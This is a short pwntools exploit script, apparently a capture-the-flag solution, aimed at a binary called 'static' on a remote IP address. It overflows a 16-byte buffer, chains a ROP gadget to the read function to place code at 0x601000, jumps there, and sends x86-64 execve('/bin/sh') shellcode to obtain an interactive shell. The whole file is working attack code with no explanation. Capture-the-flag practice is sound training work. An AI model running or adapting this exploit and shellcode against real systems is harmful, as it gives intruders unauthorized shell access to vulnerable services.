from pwn import*
elf=ELF('./static')  #offset 16
#p=process('./static')
p=remote("118.89.138.44",30002)
context.log_level='debug'
#gdb.attach(proc.pidof(p)[0])

rop=ROP(elf)
rdi=rop.rdi[0]
rsi_r15=rop.rsi[0]

p.recvuntil("zsctf!")

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload='A'*16
payload+=p64(rsi_r15)
payload+=p64(0x601000)
payload+=p64(0)
payload+=p64(elf.plt["read"])
payload+=p64(0x601000)

p.sendline(payload)
pause()
p.sendline(shellcode+"\x00")

p.interactive()
